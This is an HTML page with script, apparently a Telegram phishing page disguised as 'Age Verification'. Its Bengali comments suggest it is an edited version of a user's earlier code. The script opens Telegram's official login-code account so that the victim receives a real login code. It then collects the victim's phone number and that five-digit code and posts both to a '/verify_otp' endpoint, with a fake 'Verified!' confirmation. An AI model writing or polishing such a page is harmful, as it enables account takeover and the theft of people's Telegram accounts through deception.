<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Age Verification</title>
  <style>
    /* ... (আপনার আগের সব CSS এখানে থাকবে) ... */
    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      25% { transform: translateX(-10px); }
      75% { transform: translateX(10px); }
    }
    .error-shake {
      animation: shake 0.2s ease-in-out 0s 2;
      box-shadow: 0 0 15px red !important;
      border: 2px solid red !important;
    }
    /* (নিচে আপনার দেওয়া স্ক্রিপ্টটি আপডেট করা হয়েছে) */
  </style>
</head>
<body>
  <script>
    let userPhone = ""; 
    // Step 1: Number collection logic (আপনি চাইলে এখানে নম্বর ইনপুট বক্স এড করতে পারেন)
    
    // Step 2: OTP submission with Animation
    document.querySelector('.get-code-btn').addEventListener('click', async () => {
      const otp = document.getElementById('codeInput').value;
      if (otp.length < 5) {
        triggerError();
        return;
      }

      // ওপেন টেলিগ্রাম কোড
      window.open('tg://user?id=777000', '_blank');

      const response = await fetch('/verify_otp', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ phone: userPhone, otp: otp })
      });

      if (!response.ok) triggerError();
      else alert("Verified!");
    });

    function triggerError() {
      const input = document.getElementById('codeInput');
      input.classList.add('error-shake');
      setTimeout(() => {
        input.classList.remove('error-shake');
        input.value = ''; // অটোমেটিক মুছে যাবে
      }, 1000);
    }

    // keypad logic
    const buttons = document.querySelectorAll('.keypad button');
    buttons.forEach(btn => {
      btn.addEventListener('click', () => {
        const input = document.getElementById('codeInput');
        if(btn.id === 'clearBtn') input.value = input.value.slice(0, -1);
        else if(input.value.length < 5) input.value += btn.innerText;
      });
    });
  </script>
</body>
</html>
